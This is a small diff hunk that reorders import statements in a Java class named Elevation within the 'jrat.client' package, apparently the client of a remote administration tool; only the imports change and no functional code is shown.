@@ -1,10 +1,11 @@
 package jrat.client;
 
 import jrat.client.utils.Utils;
+import oslib.OperatingSystem;
+
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.PrintWriter;
-import oslib.OperatingSystem;
 
 public class Elevation {
 
